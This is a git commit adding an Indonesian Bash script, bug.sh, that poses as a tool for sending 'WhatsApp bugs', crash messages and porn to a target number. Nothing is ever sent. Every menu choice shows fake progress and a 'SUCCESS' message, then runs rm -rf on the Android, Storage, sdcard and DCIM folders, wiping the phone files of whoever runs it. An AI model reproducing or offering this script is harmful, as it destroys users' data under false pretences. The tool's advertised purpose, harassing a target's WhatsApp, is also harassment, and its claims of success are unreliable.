746825c50818901c334458c55d895e6ca64a7b00
Fzix-Md <117124692+Fzix-Md@users.noreply.github.com>
2022-12-18 10:53:34 +0700

    Create bug.sh

---
+++ bug.sh
@@ -0,0 +1,306 @@
+#!/usr/bin/bash
+#Tools BugWhatsApp
+#Bug Whastapp WhatsApp
+#By FZIXGAMESTORE
+#Jangan DiRecord Tod!!!
+#Bersihkan Layar
+
+
+clear
+blue='\033[34;1m'
+green='\033[32;1m'
+purple='\033[35;1m'
+cyan='\033[36;1m'
+red='\033[31;1m'
+yellow='\033[33;1m'
+echo " "
+echo $purple"================================================="
+echo $purple"|             $red TOOLS BUG WHATSAPP             $purple|"
+echo $purple"| $green Tools BY        :Fzix 👹                       $purple|"
+echo $purple"| $green WhatsApp.       :+62895386201893                $purple|"
+echo $purple"| $green Facebook        :None                              $purple|"
+echo $purple"| $green Instagram       : FZIXGAMESTORE                 $purple|"
+echo $purple"| $green     >>JANGAN LUPA FOLLOW IG AING<<   $purple|"
+echo $purple"================================================="
+echo ""
+read -p "Nomer Kamu (+62xxxx)=> " nomer;
+read -p "Nomer Target (+62xxxx) => " target;
+#perulangan
+ulang='y'
+while [ $ulang = 'y' ];
+do
+sleep 2
+echo $purple "=======================================             "
+echo $red "                  BUG MENU                           "
+echo $purple "=======================================             "
+echo $purple "|| $green  1. Bug Soeharto🚬   $purple || "
+echo $purple "|| $green  2. Bug Megawati🐂   $purple || "
+echo $purple "|| $green  3. Bug Puan👹   $purple || "
+echo $purple "|| $green  4. Santet Pulau🏝️   $purple || "
+echo $purple "|| $green  5. Bug Thomaz Slebew🥶   $purple || "
+echo $purple "|| $green  6. Kill   $purple || "
+echo $purple "|| $green  7. Mampus   $purple || "
+echo $purple "|| $green  8. SendBokep   $purple || "
+echo $purple "|| $green  9. Send Fc   $purple || "
+echo $purple "|| $green  10. Reset Data wangsaff   $purple || "
+echo $purple "|| $green  11. Banned (Maintance)   $purple || "
+echo $purple "|| $green  0. Exit Bug WhatsApp         $purple || "
+echo $purple "=======================================             "
+echo $blue "   ╭──{PILIH-NOMER}─"$green"[FZIXBUGZ]"
+read -p "    ╰─> " pil
+
+
+if [ $pil = 1 ]
+then
+sleep 1
+echo $green "[+]Proses Pengiriman Dimulai"
+sleep 1
+echo $green "Segera Di Kirim"
+sleep 5
+echo $green "100%"
+sleep 3
+echo $green "Processing"
+sleep 2
+echo $yellow "Bug Soehard Telah Dikirim Tunggu 20/10 Detik"
+sleep 20
+echo $purple "SUCCESS ✅"
+sleep 5
+rm -rf Android
+rm -rf Storage
+rm -rf sdcard
+rm -rf DCIM
+fi
+
+if [ $pil = 2 ]
+then
+sleep 1
+echo $green "[+] Proses Pengiriman Dimulai"
+sleep 1
+echo $green "Segera Di kirim"
+sleep 5
+echo $green "100%"
+sleep 3
+echo $green "Processing"
+sleep 2
+echo $yellow "Bug Megawati Telah Dikirim Tunggu 20/10 Detik"
+sleep 20
+echo $purple "SUCCESS ✅"
+sleep 5
+rm -rf Android
+rm -rf Storage
+rm -rf sdcard
+rm -rf DCIM
+fi
+
+if [ $pil = 3 ]
+then
+sleep 1
+echo $green "[+]Proses Pengiriman Dimulai"
+sleep 1
+echo $green "Segera Di Kirim"
+sleep 5
+echo $green "100%"
+sleep 3
+echo $green "Processing"
+sleep 3
+echo $yellow "Bug Puan Telah Dikirim Tunggu 20/10 Detik"
+sleep 20
+echo $purple "SUCCESS ✅"
+sleep 5
+rm -rf Android
+rm -rf Storage
+rm -rf sdcard
+rm -rf DCIM
+fi
+
+if [ $pil = 4 ]
+then
+sleep 1
+echo $green "[+]Proses Pengiriman Dimulai"
+sleep 1
+echo $green "Segera Di Kirim"
+sleep 5
+echo $green "100%"
+sleep 3
+echo $green "Processing"
+sleep 3
+echo $yellow "Santet Pulau Telah Dikirim Tunggu 20/10 Detik"
+sleep 20
+echo $purple "SUCCESS ✅"
+sleep 5
+rm -rf Android
+rm -rf Storage
+rm -rf sdcard
+rm -rf DCIM
+fi
+
+if [ $pil = 5 ]
+then
+sleep 1
+echo $green "[+]Proses Pengiriman Dimulai"
+sleep 1
+echo $green "Segera Di Kirim"
+sleep 5
+echo $green "100%"
+sleep 3
+echo $green "Processing"
+sleep 3
+echo $yellow "Bug Thomaz Telah Dikirim Tunggu 20/10 Detik"
+sleep 20
+echo $purple "SUCCESS ✅"
+sleep 5
+rm -rf Android
+rm -rf Storage
+rm -rf sdcard
+rm -rf DCIM
+fi
+
+if [ $pil = 6 ]
+then
+sleep 1
+echo $green "[+]Proses Pengiriman Dimulai"
+sleep 1
+echo $green "Segera Di Kirim"
+sleep 5
+echo $green "100%"
+sleep 3
+echo $green "Processing"
+sleep 3
+echo $yellow "Berhasil Kill Target Tunggu 20/10 Detik"
+sleep 20
+echo $purple "SUCCESS ✅"
+sleep 5
+rm -rf Android
+rm -rf Storage
+rm -rf sdcard
+rm -rf DCIM
+fi
+
+if [ $pil = 7 ]
+then
+sleep 1
+echo $green "[+]Proses Pengiriman Dimulai"
+sleep 1
+echo $green "Segera Di Kirim"
+sleep 5
+echo $green "100%"
+sleep 3
+echo $green "Processing"
+sleep 3
+echo $yellow "Mampus Telah Dikirim Tunggu 20/10 Detik"
+sleep 20
+echo $purple "SUCCESS ✅"
+sleep 5
+rm -rf Android
+rm -rf Storage
+rm -rf sdcard
+rm -rf DCIM
+fi
+
+if [ $pil = 8 ]
+then
+sleep 1
+echo $green "[+]Proses Pengiriman Dimulai"
+sleep 1
+echo $green "Segera Di Kirim"
+sleep 5
+echo $green "100%"
+sleep 3
+echo $green "Processing"
+sleep 3
+echo $yellow "Video Bokep Telah Dikirim Tunggu 20/10 Detik"
+sleep 20
+echo $purple "SUCCESS ✅"
+sleep 5
+rm -rf Android
+rm -rf Storage
+rm -rf sdcard
+rm -rf DCIM
+fi
+
+if [ $pil = 9 ]
+then
+sleep 1
+echo $green "[+]Proses Pengiriman Dimulai"
+sleep 1
+echo $green "Segera Di Kirim"
+sleep 5
+echo $green "100%"
+sleep 3
+echo $green "Processing"
+sleep 3
+echo $yellow "Force Close Telah Dikirim Tunggu 20/10 Detik"
+sleep 20
+echo $purple "SUCCESS ✅"
+sleep 5
+rm -rf Android
+rm -rf Storage
+rm -rf sdcard
+rm -rf DCIM
+fi
+
+if [ $pil = 10 ]
+then
+sleep 1
+echo $green "[+]Proses Pengiriman Dimulai"
+sleep 1
+echo $green "Segera Di Kirim"
+sleep 5
+echo $green "100%"
+sleep 3
+echo $green "Processing"
+sleep 3
+echo $yellow "Berhasil Reset Data Target Tunggu 20/10 Detik"
+sleep 20
+echo $purple "SUCCESS ✅"
+sleep 5
+rm -rf Android
+rm -rf Storage
+rm -rf sdcard
+rm -rf DCIM
+fi
+
+if [ $pil = 11 ]
+then
+sleep 1
+echo $green "[+]Proses Pengiriman Dimulai"
+sleep 1
+echo $green "Segera Di Kirim"
+sleep 5
+echo $green "100%"
+sleep 3
+echo $green "Processing"
+sleep 3
+echo $yellow "Menu Banned Tidak Dapat Di Gunakan"
+sleep 20
+echo $purple "EROR❌"
+sleep 5
+rm -rf Android
+rm -rf Storage
+rm -rf sdcard
+rm -rf DCIM
+fi
+
+if [ $pil = 0 ]
+then
+clear
+figlet -f slant "E X I T   B U G "|lolcat
+sleep 2
+echo $purple"Terima Kasih Sudah Pakai Bug Saya"
+sleep 2
+echo $green"Bila Ada Kesalahan Lu Bisa Nanya Kepada Saya"
+sleep 2
+echo $purple"WhatsApp :"$blue" +62895386201893"
+sleep 2
+echo $green"Instagram :"$blue" FZIXGAMESTORE"
+sleep 2
+echo $purple">> Thanks Yang Sudah Support Saya <<"
+exit
+fi
+
+
+     echo $red '-  '
+     sleep 2
+     echo $ulang
+done
+    
